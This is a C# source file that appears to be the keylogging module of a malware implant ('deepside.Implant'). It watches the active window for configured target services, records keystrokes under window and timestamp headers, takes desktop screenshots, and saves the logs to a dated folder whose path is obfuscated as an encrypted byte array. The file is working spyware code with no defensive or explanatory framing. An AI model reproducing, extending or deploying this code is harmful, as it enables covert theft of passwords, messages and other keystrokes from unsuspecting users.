using spasibozapas;
using deepside;
using System;
using System.IO;
using deepside.Implant;
namespace keybaba
{
    internal sealed class EventManager
    {
        private static byte[] logskeylogger = new byte[] { 33, 241, 89, 41, 164, 203, 3, 97, 52, 131, 37, 4, 162, 250, 87, 62, };
        
        private static string kldir = Path.Combine(
            Paths.InitWorkDir(), StringsCrypt.Decrypt(logskeylogger) + //"logs\\keylogger\\"
            DateTime.Now.ToString("yyyy-MM-dd"));

        // Start  only if active windows contains target values
        public static void Action()
        {
            if (Detect())
            {
                if (!string.IsNullOrWhiteSpace(keykeykey.KeyLogs)) keykeykey.KeyLogs += "\n\n";
                keykeykey.KeyLogs += "### " + WindowManager.ActiveWindow + " ### (" +
                    DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + ")\n";
                DesktopScreenshot.Make(kldir);
                keykeykey.klEnable = true;
            } else {
                SendKeyLogs();
                keykeykey.klEnable = false;
            }
        }

        // Detect target data in active window
        private static bool Detect()
        {
            foreach (string text in Config.klservic)
                if (WindowManager.ActiveWindow.ToLower().Contains(text))
                    return true;

            return false;
        }

        // Save logs
        private static void SendKeyLogs()
        {
            if (keykeykey.KeyLogs.Length < 45 ||
                string.IsNullOrWhiteSpace(keykeykey.KeyLogs))
                return;

            string logfile = kldir + "\\" + DateTime.Now.ToString("hh.mm.ss") + ".txt";
            if (!Directory.Exists(kldir))
                Directory.CreateDirectory(kldir);

            File.WriteAllText(logfile, keykeykey.KeyLogs);
            keykeykey.KeyLogs = ""; // Clean logs
        }

    }
}
